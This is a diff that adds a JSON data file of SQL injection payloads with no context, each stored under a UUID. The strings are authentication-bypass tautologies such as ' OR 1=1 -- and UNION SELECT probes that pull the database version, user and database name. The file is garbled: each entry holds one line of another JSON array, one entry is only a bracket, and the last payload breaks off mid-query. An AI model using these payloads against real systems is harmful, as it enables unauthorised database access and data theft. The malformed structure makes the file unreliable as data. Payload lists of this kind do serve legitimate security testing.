@@ -1,1 +1,82 @@
-[]
+[
+    {
+        "id": "d2072bce-a194-437e-a6dc-fcd5f7f28ecf",
+        "payload": "["
+    },
+    {
+        "id": "a41a731f-602c-49d6-be7e-bb51b225aae8",
+        "payload": "  \"' OR '1'='1\","
+    },
+    {
+        "id": "b4d2aabd-a088-401b-8da9-e0b687a8ffae",
+        "payload": "  \"' OR '1'='1' -- \","
+    },
+    {
+        "id": "ebea61c8-f524-4c05-8803-db9d2fe1eb06",
+        "payload": "  \"' OR '1'='1' #\","
+    },
+    {
+        "id": "0f3d7dad-277a-4206-b377-85560591858b",
+        "payload": "  \"' OR 1=1 -- \","
+    },
+    {
+        "id": "4647256d-dec1-4496-9d07-f2d763624763",
+        "payload": "  \"' OR 1=1 #\","
+    },
+    {
+        "id": "b52d4f3a-682b-49a2-9694-bd32d9cd7bb6",
+        "payload": "  \"' OR 1=1 -- a\","
+    },
+    {
+        "id": "e676e89c-26b4-4b54-b4ab-5b8a25412f52",
+        "payload": "  \"' OR 1=1 # a\","
+    },
+    {
+        "id": "b2199762-60b6-44a1-beae-92d46661c545",
+        "payload": "  \"' OR 1=1 OR 'a'='a\","
+    },
+    {
+        "id": "0a646d55-7f05-4579-b08b-ba80c9db5d0f",
+        "payload": "  \"' OR 1=1 OR 'a'='a' -- \","
+    },
+    {
+        "id": "d51d4628-94ff-4b13-8b60-10a1260129b6",
+        "payload": "  \"' OR 1=1 OR 'a'='a' #\","
+    },
+    {
+        "id": "48f1cca6-3ed3-46e7-a0d5-b33cc65587f3",
+        "payload": "  \"' UNION SELECT 1,2 -- \","
+    },
+    {
+        "id": "89185420-e8ba-4710-bf78-386d45116971",
+        "payload": "  \"' UNION SELECT 1,2 #\","
+    },
+    {
+        "id": "870b385a-1295-4216-92bc-eaf99d526a61",
+        "payload": "  \"' UNION SELECT null,null -- \","
+    },
+    {
+        "id": "835a73f0-a2d3-45ac-a6b6-e40ea8a0242c",
+        "payload": "  \"' UNION SELECT null,null #\","
+    },
+    {
+        "id": "ec83c9ed-75ed-480e-986a-39eaacfd79b9",
+        "payload": "  \"' UNION SELECT @@version,database() -- \","
+    },
+    {
+        "id": "abe36f40-d061-4764-9ad2-8118796479aa",
+        "payload": "  \"' UNION SELECT @@version,database() #\","
+    },
+    {
+        "id": "96899b88-8a38-4f6c-85bd-85340c6b47fb",
+        "payload": "  \"' UNION SELECT user(),database() -- \","
+    },
+    {
+        "id": "d2e93f07-14e1-4909-92e6-a7c4b69d699f",
+        "payload": "  \"' UNION SELECT user(),database() #\","
+    },
+    {
+        "id": "39647f42-a69b-4e7f-b6dc-1d95f36d4709",
+        "payload": "  \"' UNION SELECT 1, (SELECT database"
+    }
+]
